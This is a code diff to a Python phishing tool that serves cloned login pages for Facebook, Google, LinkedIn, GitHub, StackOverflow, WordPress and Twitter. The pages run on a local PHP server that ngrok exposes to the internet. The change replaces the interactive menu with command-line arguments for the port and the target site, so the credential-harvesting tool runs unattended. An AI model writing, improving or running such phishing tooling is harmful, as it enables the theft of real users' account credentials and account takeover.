@@ -1,7 +1,7 @@
 #-*- coding: utf-8 -*-
 ###########################
 from time import sleep
-from sys import stdout, exit
+import sys
 from os import system, path
 import multiprocessing
 from urllib import urlopen
@@ -77,40 +77,42 @@ def runPEnv():
     if 256 == system('which php > /dev/null'):
         print "{0}[{1}x{0}]{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
         exit(0)
-    option = raw_input() ##
-    if option == '1':
+    if str(sys.argv[2]) == "fb" :
         loadModule('Facebook')
-        option2 = raw_input()
+        option2 = "1"
         runPhishing('Facebook', option2)
-    elif option == '2':
+    elif str(sys.argv[2]) == 'google':
         loadModule('Google')
-        option2 = raw_input()
+        option2 = "1"
         runPhishing('Google', option2)
-    elif option == '3':
+    elif str(sys.argv[2]) == "in":
         loadModule('LinkedIn')
         option2 = ''
         runPhishing('LinkedIn', option2)
-    elif option == '4':
+    elif str(sys.argv[2]) == 'git':
         loadModule('Github')
         option2 = ''
         runPhishing('Github', option2)
-    elif option == '5':
+    elif str(sys.argv[2]) == 'stack':
         loadModule('StackOverflow')
         option2 = ''
         runPhishing('StackOverflow', option2)
-    elif option == '6':
+    elif str(sys.argv[2]) == 'wp':
         loadModule('WordPress')
         option2 = ''
         runPhishing('WordPress', option2)
-    elif option == '7':
+    elif str(sys.argv[2]) == 'twitter':
         loadModule('Twitter')
         option2 = ''
         runPhishing('Twitter', option2)
     else:
         exit(0)
 
+port = sys.argv[1]
+ngrokcommand='./Server/ngrok http ' + str(port) + ' > /dev/null &'
+phpservercommand='cd Server/www/ && sudo php -S 127.0.0.1:' + str(port) + ' 2> /dev/null 1> /dev/null'
 def runNgrok():
-    system('./Server/ngrok http 80 > /dev/null &')
+    system(ngrokcommand)
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
@@ -118,7 +120,7 @@ def runNgrok():
     url.close()
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:80 2> /dev/null 1> /dev/null")
+    system(phpservercommand)
 
 if __name__ == "__main__":
     try:
